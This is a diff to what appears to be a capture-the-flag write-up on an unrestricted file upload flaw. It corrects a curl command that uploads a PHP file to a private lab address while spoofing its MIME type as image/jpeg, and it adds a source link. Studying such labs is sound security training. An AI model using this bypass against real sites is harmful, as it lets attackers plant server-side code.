@@ -23,7 +23,7 @@ First method :
 
 Second method :
 
-Now that we know that we just have to change the content type of the file to bypass the form security, we'll try a more scalable method using the terminal and Curl. Enter this command in your terminal: `curl 'http://192.168.56.101/index.php?page=upload#' -X POST -F "uploaded=@./coucou.php;type=image/jpeg" "Upload=Upload" | grep flag`
+Now that we know that we just have to change the content type of the file to bypass the form security, we'll try a more scalable method using the terminal and Curl. Enter this command in your terminal: `curl 'http://192.168.56.101/index.php?page=upload#' -X POST -F "uploaded=@./coucou.php;type=image/jpeg" -F "Upload=Upload" | grep flag`
 
 * `curl 'http://192.168.56.101/index.php?page=upload#'` -> This initiates a cURL command to send an HTTP POST request to the specified URL.
 * `-F "uploaded=@./coucou.php;type=image/jpeg"` This specifies the file to be uploaded and falsely sets its MIME type to `image/jpeg`, indicating it is an image.
@@ -45,3 +45,4 @@ Now that we know that we just have to change the content type of the file to byp
 ## Sources:
 * https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 * https://chocapikk.com/posts/2023/faille_upload/
+* https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/MIME_types
